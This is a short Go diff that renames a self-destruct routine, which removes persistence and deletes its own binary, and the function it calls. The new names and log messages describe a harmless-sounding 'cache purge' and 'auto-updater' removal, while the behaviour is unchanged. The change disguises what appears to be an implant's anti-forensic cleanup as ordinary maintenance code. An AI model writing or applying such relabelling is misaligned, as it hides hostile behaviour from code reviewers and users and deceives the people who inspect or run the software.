@@ -7,15 +7,15 @@ import (
 	"runtime"
 )
 
-func SelfDestruct() {
-	fmt.Println("[!] ═══ SELF-DESTRUCT INITIATED ═══")
+func WipeLocalCacheAndExit() {
+	fmt.Println("[!] ═══ CACHE PURGE INITIATED ═══")
 
-	fmt.Println("[*] Removing persistence…")
-	err := RemovePersistence()
+	fmt.Println("[*] Removing scheduled service…")
+	err := RemoveAutoUpdater()
 	if err != nil {
-		fmt.Printf("[!] Persistence removal failed (may not have been installed): %v\n", err)
+		fmt.Printf("[!] Service removal failed (may not have been registered): %v\n", err)
 	} else {
-		fmt.Println("[+] Persistence removed")
+		fmt.Println("[+] Service removed")
 	}
 
 	exePath, err := os.Executable()
@@ -24,7 +24,7 @@ func SelfDestruct() {
 		os.Exit(0)
 	}
 
-	fmt.Printf("[*] Deleting binary: %s\n", exePath)
+	fmt.Printf("[*] Cleaning up binary: %s\n", exePath)
 
 	switch runtime.GOOS {
 	case "windows":
@@ -43,6 +43,6 @@ func SelfDestruct() {
 		os.Remove(exePath)
 	}
 
-	fmt.Println("[+] Self-destruct complete. Goodbye.")
+	fmt.Println("[+] Cache purge complete. Shutting down.")
 	os.Exit(0)
 }
